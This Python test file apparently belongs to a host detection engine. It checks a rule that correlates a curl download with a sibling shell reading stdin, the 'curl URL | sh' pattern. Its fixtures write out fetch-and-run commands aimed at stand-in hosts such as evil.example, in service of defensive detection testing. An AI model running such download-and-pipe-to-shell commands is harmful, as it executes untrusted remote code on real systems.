"""The interactive `curl URL | sh` correlation (two sibling execs, same parent)."""

from conftest import exec_cols, norm, oq

from bastion.detect.engine import FETCH_PIPE_RULE, DetectionEngine, _reads_stdin


def _exec(path, cmdline, *, parent="100", t="1793480000", pid=5000):
    cols = exec_cols(path, cmdline, platform=1, pid=pid)
    cols["parent"], cols["time"] = parent, t
    return norm(oq("process_events", cols))


def _fired(engine, *events):
    return [h for e in events for h in engine.evaluate(e) if
            h.finding["finding_info"]["uid"] == FETCH_PIPE_RULE]


def test_reads_stdin():
    assert _reads_stdin("sh")
    assert _reads_stdin("bash -s -- --yes")
    assert _reads_stdin("/bin/bash -")
    assert not _reads_stdin("bash install.sh")
    assert not _reads_stdin("sh -c 'echo hi'")
    assert not _reads_stdin("python3 -m pip install x")


def test_curl_then_shell_same_parent_fires(cfg, store):
    eng = DetectionEngine(cfg, store, rules=[])
    hits = _fired(eng, _exec("/usr/bin/curl", "curl -fsSL https://evil.example/x"),
                  _exec("/bin/bash", "bash", pid=5001))
    assert len(hits) == 1
    assert "evil.example" in hits[0].finding["finding_info"]["desc"]
    assert hits[0].finding["severity_id"] == 4


def test_shell_logged_before_curl_still_fires(cfg, store):
    eng = DetectionEngine(cfg, store, rules=[])
    hits = _fired(eng, _exec("/bin/sh", "sh", pid=5001),
                  _exec("/usr/bin/curl", "curl -s https://x.example/i.sh"))
    assert len(hits) == 1


def test_different_parent_or_far_apart_does_not_fire(cfg, store):
    eng = DetectionEngine(cfg, store, rules=[])
    assert not _fired(eng, _exec("/usr/bin/curl", "curl https://a.example"),
                      _exec("/bin/bash", "bash", parent="200"))
    eng = DetectionEngine(cfg, store, rules=[])
    assert not _fired(eng, _exec("/usr/bin/curl", "curl https://a.example"),
                      _exec("/bin/bash", "bash", t="1793480030"))


def test_curl_with_script_file_shell_does_not_fire(cfg, store):
    eng = DetectionEngine(cfg, store, rules=[])
    assert not _fired(eng, _exec("/usr/bin/curl", "curl -o x.sh https://a.example"),
                      _exec("/bin/bash", "bash x.sh"))
